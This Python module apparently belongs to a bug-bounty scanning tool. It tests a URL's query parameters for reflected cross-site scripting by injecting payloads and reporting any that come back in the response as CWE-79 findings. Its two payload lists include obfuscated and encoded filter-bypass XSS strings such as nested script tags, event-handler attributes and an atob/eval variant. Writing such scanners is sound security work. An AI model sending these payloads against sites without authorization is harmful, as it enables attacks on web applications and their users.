"""Reflected XSS detection via payload reflection."""

import re
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from ..models import Finding, FindingType, Severity


# Safe payloads that reflect without executing (detection only)
XSS_PAYLOADS = [
    "bounty<x>scan",
    "bounty\"scan",
    "bounty'scan",
    "bounty`scan",
    "<script>alert(1)</script>",
    "'';alert(1)//",
    "\"><img src=x onerror=alert(1)>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
]

# Extreme: obfuscated and encoded payloads
XSS_EXTREME_PAYLOADS = [
    "<script>alert(1)</script>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<script>alert(String.fromCharCode(49))</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "javascript:alert(1)",
    "\"><img src=x onerror=alert(1)>",
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
    "<img src=\"x\" onerror=\"alert(1)\">",
    "<iframe src=\"javascript:alert(1)\">",
    "<object data=\"javascript:alert(1)\">",
    "<embed src=\"javascript:alert(1)\">",
    "<math><maction actiontype=statusline#http://evil>click",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "\u003cscript\u003ealert(1)\u003c/script\u003e",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "<script>\\u0061lert(1)</script>",
    "<img src=x onerror=\\u0061lert(1)>",
    "<svg/onload=&#97lert(1)>",
    "\"><img src=x onerror=alert`1`>",
    "';alert(1)//",
    "\";alert(1)//",
    "`;alert(1)//",
    "--></script><script>alert(1)</script>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
]


def inject_payload(url: str, param: str, payload: str) -> str:
    """Replace or append payload to query parameter."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))


def check_xss(url: str, session: requests.Session | None = None, extreme: bool = False) -> list[Finding]:
    """Check for reflected XSS in query parameters. If extreme, use many more obfuscated payloads."""
    findings = []
    session = session or requests.Session()
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)

    if not params:
        return findings

    payloads = (XSS_PAYLOADS + XSS_EXTREME_PAYLOADS) if extreme else XSS_PAYLOADS
    for param in list(params.keys()):
        for payload in payloads:
            try:
                test_url = inject_payload(url, param, payload)
                resp = session.get(test_url, timeout=10)
                # Check if payload appears in response (reflected)
                if payload in resp.text or payload.replace("<", "&lt;") in resp.text:
                    findings.append(Finding(
                        finding_type=FindingType.XSS,
                        severity=Severity.HIGH,
                        title="Possible reflected XSS",
                        description=f"Parameter '{param}' reflects user input. Verify if payload can execute.",
                        url=test_url,
                        evidence=f"Payload reflected: {payload[:50]}...",
                        recommendation="Encode output and use Content-Security-Policy. Validate/sanitize input.",
                        cwe_id="CWE-79",
                    ))
                    break  # One finding per parameter
            except requests.RequestException:
                continue

    return findings
